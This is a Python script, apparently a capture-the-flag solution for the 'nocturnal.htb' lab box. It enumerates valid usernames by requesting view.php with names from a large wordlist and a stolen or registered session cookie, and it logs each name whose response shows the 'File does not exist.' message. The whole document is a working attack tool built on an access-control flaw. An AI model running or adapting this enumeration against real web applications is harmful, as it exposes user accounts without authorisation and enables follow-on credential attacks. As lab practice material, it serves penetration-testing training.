#!/usr/bin/python3

from pwn import *
import requests, signal, sys

# Variables
wordlist = '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
count = 0
found = []

# Processing input
if len(sys.argv) != 2:
    print("Make user to register and log is a a user to get a session cookie")
    print("Usage: python3 enumusers.py <cookie>")
    sys.exit(1)
else:
    print("NOTE: If \"Usernames found\" is too large or doesn't find any users, you may need to reset the box and try again. \n")
    cookie = sys.argv[1]

# Ctr + c 
def df_handler(sig,frame):
    log.info('\n[!] Exiting... \n')
    sys.exit(1)

signal.signal(signal.SIGINT, df_handler)

# Starting progress bars
prog_enum = log.progress('Enumerating usernames')
prog_found = log.progress('Usernames found')

# Start enumeration
file = open(wordlist, 'r')
while True:
    sleep(0.5)
    count += 1
    username = file.readline()[0:-1]
    enumURL = "http://nocturnal.htb/view.php?username="+username+"&file=pwn.xlsx"
    cookies = {'PHPSESSID':cookie}
    r = requests.get(enumURL, cookies=cookies)
    
    prog_enum.status(username)

    if "File does not exist." in r.text:
        found.append(username)
        prog_found.status(','.join(found))

    if not username:
        break

file.close()    